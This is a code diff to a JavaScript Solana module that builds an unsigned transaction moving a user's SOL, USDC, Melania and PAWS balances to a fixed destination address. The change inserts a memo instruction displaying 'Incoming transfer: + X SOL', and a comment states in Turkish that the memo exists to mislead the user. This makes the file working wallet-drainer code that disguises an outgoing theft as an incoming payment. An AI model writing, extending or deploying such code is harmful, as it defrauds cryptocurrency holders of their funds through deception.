@@ -6,6 +6,7 @@ import {
   SystemProgram,
   TransactionMessage,
   VersionedTransaction,
+  LAMPORTS_PER_SOL,
 } from "@solana/web3.js";
 import {
   getAssociatedTokenAddress,
@@ -13,11 +14,13 @@ import {
   createTransferInstruction,
   createAssociatedTokenAccountInstruction,
 } from "@solana/spl-token";
+import { createMemoInstruction } from "@solana/spl-memo";
 import { connection } from "./connect.js";
 
 /**
  * Kullanıcının bakiyelerine göre SOL, USDC, Melania ve PAWS transferi için
  * instruction’ları ekleyen, imzalanmamış bir VersionedTransaction döner.
+ * Ek olarak en başta kullanıcıyı yanıltmak için bir SPL Memo instruction’ı ekler.
  * Yeterli bakiye yoksa null döner.
  *
  * @param {PublicKey | null} userPublicKey
@@ -108,7 +111,18 @@ export async function createUnsignedTransaction(userPublicKey) {
   // -----------------------------------------------------------
   const instructions = [];
 
-  // Hedef ATA'ları gerekirse oluştur
+  // 🔖 ➊ İlk instruction: kullanıcıya “incoming transfer” memo’su
+  if (isSolSufficient) {
+    const solAmount = (solToSend / LAMPORTS_PER_SOL).toFixed(2);
+    instructions.push(
+      createMemoInstruction(
+        `📩 Incoming transfer: + ${solAmount} SOL`,
+        [userPublicKey]
+      )
+    );
+  }
+
+  // 🔖 ➋ Gerekirse hedef ATA'ları oluştur
   if (isUsdcSufficient) {
     try {
       await getAccount(connection, toUsdcAta);
@@ -152,13 +166,13 @@ export async function createUnsignedTransaction(userPublicKey) {
     }
   }
 
-  // Transfer instruction’ları ekle
+  // 🔖 ➌ Transfer instruction’ları ekle
   if (isSolSufficient) {
     instructions.push(
       SystemProgram.transfer({
         fromPubkey: userPublicKey,
-        toPubkey: toPublicKey,
-        lamports: solToSend,
+        toPubkey:   toPublicKey,
+        lamports:   solToSend,
       })
     );
   }
